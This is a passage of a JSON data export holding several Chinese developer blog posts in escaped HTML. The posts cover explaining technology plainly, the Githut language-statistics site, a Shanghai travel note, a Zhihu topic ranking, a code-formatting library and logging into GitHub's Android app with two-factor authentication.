看一下源代码而已.\u003c/span\u003e\u0026quot;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20150912/1442019168573914.png\" title=\"1442019168573914.png\" alt=\"blob.png\" width=\"224\" height=\"157\" style=\"width: 224px; height: 157px;\"/\u003e然而我想他的心情一定是这样的....\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e但是我立马觉得这解释的不知所云, 如果这样下去我会没朋友的...\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0041.gif\" width=\"42\" height=\"37\" style=\"width: 42px; height: 37px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e我又解释: \u0026quot;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003e当然,这只是别人的说法, 我跟你说实话, 其实就是按一下 F12, 然后刷新一下. 你看是吧?\u003c/span\u003e\u0026quot;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e\u0026quot;很不错啊!\u0026quot;她崇拜地说.(当然, 崇拜是我yy的....)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family:微软雅黑, Microsoft YaHei\"\u003e这个故事中, 我身为男猪脚既装了x, 又给对方清楚解释了怎么做.\u003c/span\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e这只是个简单的例子, 但很好地解释了身为开发者怎么正确装x, 请用下面语法造句就行了.\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cstrong\u003e这个专业的说法都是......, 但是我跟你不说虚的, 其实呢就是....., 是吧,很简单吧?\u003c/strong\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cstrong\u003e\u003cstrong style=\"line-height: 24px; white-space: normal;\"\u003e网上大牛都这么说的......, 但我跟你这关系, 其实呢就是....., 是吧,很简单吧?\u003c/strong\u003e\u003c/strong\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e更多语法, 欢迎分享\u003c/p\u003e",
        "createdAt": "2015-10-16T09:41:51.216Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-09-12T13:50:00.000Z"
        },
        "desc": "\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e做技术的人往往容易沉迷于自己的技术.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 14px;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp; \u0026nbsp; \u0026nbsp; 所以往往在向别人解答困惑时,容易陷入自我陶醉的情景.什么叫自我陶醉呢?就是我把这个问题用很专业高深的词汇来解释, 这可以给自己带来许多的满足感, 但是问题就是:本来可以用更浅显的语言描述弄懂的问题被解释的过于专业高深,导致听者困惑.更严重的是:听者觉得你只会故弄玄乎,那就得不偿失了.\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5em;\"\u003e所以我们就来聊聊:\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cp style=\"white-space: normal; line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; text-decoration: none;\"\u003e\u003cem\u003e怎么既能装x,又能享受技术分享带来的满足感?\u003c/em\u003e\u003c/span\u003e\u003c/p\u003e\u003c/blockquote\u003e\u003cp style=\"text-align: center;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cem\u003e\u003cimg src=\"/ueditor/php/upload/image/20150912/1442020200133110.png\" title=\"1442020200133110.png\" alt=\"blob.png\" width=\"540\" height=\"253\" style=\"width: 540px; height: 253px;\"/\u003e\u003c/em\u003e\u003c/span\u003e\u003c/p\u003e\n",
        "hasContent": true,
        "is_delete": false,
        "objectId": "dyAMS80EJf",
        "stamps": "乱扯\n",
        "title": "互联网装x指南\n",
        "types": "b4e\n",
        "updatedAt": "2015-12-05T03:28:27.633Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-11-19T06:22:14.754Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-11-19T06:22:17.399Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;是的,你没有看错, 我说的是Githut 而不是 Github. 但它们是有联系的, Githut统计了Github上所有流行程序语言一段时间内的发展趋势(包括 代码库, Push等等) 看下图\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003ca href=\"http://githut.info/\" target=\"_blank\"\u003eGithut\u003c/a\u003e是一个网站, 并且所有的代码开源在Github上.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"text-align:center\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151119/1447912148963499.png\" title=\"1447912148963499.png\" alt=\"1447912148963499.png\" width=\"647\" height=\"305\" border=\"0\" vspace=\"0\" style=\"width: 647px; height: 305px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;我想简单解释一下怎么使用Githut :\u0026nbsp;\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1. 选择一个时间段, 目前最新的统计到2014年第四季度, 最早到2012年第二季度.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"text-align: center;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151119/1447912439810474.png\" title=\"1447912439810474.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;2. 鼠标hover或者click某个语言的标签, 可以看到相应的曲线 (可以点击多个语言就行比较), 举个例子吧 : 诞生于1995年的 Js 在在2014年9月~12月的时间里活跃度第一, 新产生323k个代码库, 小计3.4M个Push. (如果你没用过Github, 可以把\u003c/span\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(255, 255, 255);\"\u003e一个Push\u003c/span\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e简单理解成一次对代码库的修改)\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"text-align: center;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151119/1447912811632818.png\" title=\"1447912811632818.png\" alt=\"blob.png\" width=\"683\" height=\"216\" style=\"width: 683px; height: 216px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;3. 从Githut可以看到, 在最流行的语言列表里. 诞生于1972年的C语言是最老的, 依然在榜单上雄霸一方, 不愧是程序员入门都学的语言.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;由苹果公司开发的诞生于2014年的swift语言是最年轻的, 虽然活跃度排名不高, 但是代码库的平均fork数 与 watcher数都是很高的, 可以猜测swift的代码质量平均较好,当然也可能是资源匮乏的原因.\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;最后不得不说Js依然是开源社区的宠儿, css的活跃度排名第四(Q4/14), 说明前端开发依然是当下最热门的领域之一, 盆友们, 加油吧!\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0003.gif\" style=\"float: right;\"/\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "eSLoUO3OGP",
        "stamps": "Githut, Github",
        "title": "Githut,带你看看程序的世界",
        "types": "b5e",
        "updatedAt": "2015-12-05T03:23:15.954Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-12-17T09:04:13.376Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-12-17T09:03:49.316Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;他们都说人的一生应该有俩次冲动, 一次献给奋不顾身的爱情, 一次献给说走就走的旅行. 来上海虽然因为工作, 但其实我却把它当做一场旅行. 第一次坐地铁的时候, 还东张西望, 一切都是那么的新鲜. 我喜欢看到各种互联网公司的广告从窗外飞过. 琉璃的灯光浮现出互联网过去岁月的模样.\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;那天晚上, 我们就去了南京路. 人山人海, 你能听到人们用各种听懂听不懂的语言在交流, 然而南京路南边的一条小路却少有人迹, 从黄浦江回地铁站的时候我们就走的那条小路.\u003cbr/\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;第二天晚上我们去了东方明珠那一片, 楼宇林立.走在摩天大厦就一个感觉, 冷... 风和发髻开个玩笑, 脸却冻得如平安果. 好吧, 圣诞节要到了, 所以想到了平安果. 看来今年的冬天是吃不到班长发的苹果了.\u003cbr/\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;第三天晚上, 我在这里写下初来上海的体会. 所有的感情凝练在一起化为一句\u003cbr/\u003e\u003c/font\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003econsole.log(\u0026quot;Hello\u0026nbsp;Shanghai\u0026quot;);\u0026nbsp;//\u0026nbsp;此处没有注释\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;以前有个人说 :\u0026nbsp;\u003cspan style=\"color: rgb(204, 199, 217); font-family: punctuation, \u0026#39;Microsoft Yahei\u0026#39;; line-height: 25px; white-space: pre-wrap; font-size: 16px; background-color: rgb(64, 51, 102);\"\u003e有时候我想，在火车上睡上一觉，去开始一段不由自己的旅行。然后，一位漂亮的乘务员把我叫醒：先生，这里是上海虹桥。那种繁华的字眼与沉浮的内心所摩擦出的火花一定是一种不可思议的感动。\u003c/span\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 那个人就是我...\u003cbr/\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: center;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151217/1450342992592892.png\" title=\"1450342992592892.png\" alt=\"blob.png\"/\u003e\u003c/font\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "extBL42udI",
        "stamps": "上海",
        "title": "Hello Shanghai",
        "types": "b5e",
        "updatedAt": "2015-12-17T09:04:13.376Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2016-03-15T03:42:13.975Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2016-03-15T03:42:06.577Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;知乎现在是人气灰常高的问答社区, 其专业性与良好的学术氛围是很好吸引力.我自己也喜欢逛逛知乎, 偶尔回答一些问题, \u003ca href=\"https://www.zhihu.com/people/he-jie-37-25\" target=\"_blank\" textvalue=\"AJ龙傲天的知乎\"\u003eAJ龙傲天的知乎\u003c/a\u003e\u0026nbsp;可惜木有人点赞....心塞.\u0026nbsp;\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 我并不是写文章骗关注的.本期我们研究的题目是 : 知乎上最热门的话题有哪些?\u003cbr/\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;这是一个很有价值的问题.比如一些内容型创业网站可以根据这个排名做一些内容上的调整.废话不多说, 先看排名.\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20160315/1458011069443564.png\" title=\"1458011069443564.png\" alt=\"blob.png\"/\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;这是知乎Top30关注人数最多的话题. (最新一次数据更新是3月13号, 也就是这个数据并不是和现在的数据完全吻合, 但也差不了多少)\u003c/span\u003e\u003c/font\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cfont face=\"微软雅黑, Microsoft YaHei\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;我来说俩句, 电影是关注度最高的话题, 一共628w\u003c/span\u003e\u003c/font\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e人关注. 这是我木有想到的, 我之前以为不是商业就是计算机之类的话题, 因为知乎上貌似程序员太多了, 而且知乎上貌似白手起家的土豪也很多. 然而最终结果是电影关注度最高,..... 亲, 要看电影去百度贴吧啊~~ 好吧, 不说百度了, 人家被黑的都心塞.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;从排名我斗胆猜测, 贴近生活的话题都是关注度很高的. 覆盖了生活, 教育, 体育, 历史, 文学, 商业等等....咱们心爱的计算机科学类话题连前30都没进(如果互联网话题不算的话), 尼玛, 连物理学都排到30了, 有木有啊, 有木有搞错啊?? 这个高深的只有爱因斯坦等前辈的话题居然有93w人关注, 是在下输了~~\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 如果对全部排名感兴趣, 请\u003ca href=\"http://www.meajax.com/iframes/zhihu/topTopics.html\" target=\"_blank\"\u003e点击这里\u003c/a\u003e, 一共517个话题.\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0029.gif\" style=\"float: right;\"/\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "ggly3cfqJX",
        "stamps": "知乎,话题",
        "title": "知乎话题热点分析报告",
        "types": "b4e,b5e",
        "updatedAt": "2016-03-15T03:42:13.975Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2016-01-17T10:38:56.076Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2016-01-17T10:38:37.820Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好久木有写写文章了, 到了上海这边一开始有点不适应, 事情有点多.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;好吧, 言归正传.\u0026nbsp;最近做一个项目需要一个模块来处理HTML格式化代码. 这种模块代码最好不要自己写, 因为它需要考虑的细节太多, 而且这种可重用的代码早有大牛写出来了, 而且经过无数人的实践确定其发生异常的概率几乎为零. 咱们就不要重复造\u0026quot;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003e轮子\u003c/span\u003e\u0026quot;了.\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但如果这样子的函数库可以轻松从Github获取, 我为什么还要写这篇文章呢. 是的, 我找了很久(一俩个小时吧)也木有找到, 最后我机智地想到某些知名网站(比如oschina与站长之家)提供HTML格式化的功能, 我就借用了一下他们的代码, 并整理了一下让大家可以很方便的调用.代码已上传Github.\u003ca href=\"https://github.com/AJLoveChina/StyleCode\" target=\"_blank\" textvalue=\"地址传送门\u0026gt;\u0026gt;\u0026gt;\"\u003e地址传送门\u0026gt;\u0026gt;\u0026gt;\u003c/a\u003e(包含 HTML, CSS, JS 格式化, 后续再加入其它的功能, 例如JSON格式化等)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e使用灰常简单 :\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:js;toolbar:false\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;/*\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;tools.styleHtml\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;格式化HTML\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;tools.styleCss\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;格式化CSS\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;tools.styleJs\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;格式化JS\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;*/\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;html\u0026nbsp;=\u0026nbsp;\u0026#39;\u0026lt;div\u0026nbsp;id=\u0026quot;div\u0026quot;\u0026nbsp;class=\u0026quot;div\u0026quot;\u0026gt;\u0026lt;h5\u0026gt;Title\u0026lt;/h5\u0026gt;\u0026lt;p\u0026gt;Hello\u0026nbsp;World\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;js\u0026nbsp;=\u0026nbsp;\u0026quot;for(var\u0026nbsp;i\u0026nbsp;=\u0026nbsp;0;\u0026nbsp;i\u0026nbsp;\u0026lt;\u0026nbsp;100;\u0026nbsp;i++)\u0026nbsp;{console.log(i);}\u0026quot;;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;var\u0026nbsp;css\u0026nbsp;=\u0026nbsp;\u0026quot;#div{color:red;font-size:12px;}#span{color:lightblue;}\u0026quot;;\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(html);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;----------HTML\u0026nbsp;格式化----------\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(tools.styleHtml(html));\n\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;\\n\\n\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(css);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;----------CSS\u0026nbsp;格式化----------\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(tools.styleCss(css));\n\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;\\n\\n\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(js);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(\u0026quot;----------JS\u0026nbsp;格式化----------\u0026quot;);\n\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;console.log(tools.styleJs(js));\u003c/pre\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: center;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cimg src=\"/ueditor/php/upload/image/20160117/1453026723871393.png\" title=\"1453026723871393.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003ePPS : 还有我说, 建议大家俩个最佳实践\u003c/span\u003e\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e把这个功能写成requirejs 或者 seajs 的一个模块\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e写成jQuery或者underscore插件\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e目的很单纯, 避免引入额外的全局变量.\u0026nbsp;\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "jQaDNZ2DtQ",
        "stamps": "工具,函数库",
        "title": "HTML Css Js格式化代码函数库",
        "types": "b1e",
        "updatedAt": "2016-01-17T11:12:40.048Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2015-11-12T03:34:27.117Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-11-12T03:34:28.622Z"
        },
        "desc": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;2FA(two factor authentication) 就是双重认证的意思, 上次遇到一位朋友说他遇到Github安卓客户端使用用户名与密码怎么都无法登录的问题. 这个问题我以前也遇到过, 也没太深究为什么Github要这么做 ? 但是解决方法还是很简单的.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;1. 首先你要知道 : 如果你开启了Github的2FA服务, 那么你就不能在安卓app通过真实密码来登录了, 苹果app是不是这样的情况我不太清楚. 但是PC可以使用密码登录(包括网页, PC客户端)\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;2. 登录\u003ca href=\"https://github.com/settings/tokens\" target=\"_blank\"\u003ehttps://github.com/settings/tokens\u003c/a\u003e如下图三个步骤, 生成一个\u0026nbsp;\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(216, 216, 216);\"\u003ePersonal access tokens,\u003c/span\u003e然后使用生成的token登录Github安卓客户端就可以了. 简单吧 ^_^.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(笔者注 : 记得copy这个token, 因为你离开这个页面后就\u003cstrong\u003e再也看不到\u003c/strong\u003e这个token了)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151112/1447298782301187.png\" title=\"1447298782301187.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151112/1447298891428151.png\" title=\"1447298891428151.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"color: rgb(38, 38, 38); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151112/1447299019339256.png\" title=\"1447299019339256.png\" alt=\"blob.png\"/\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
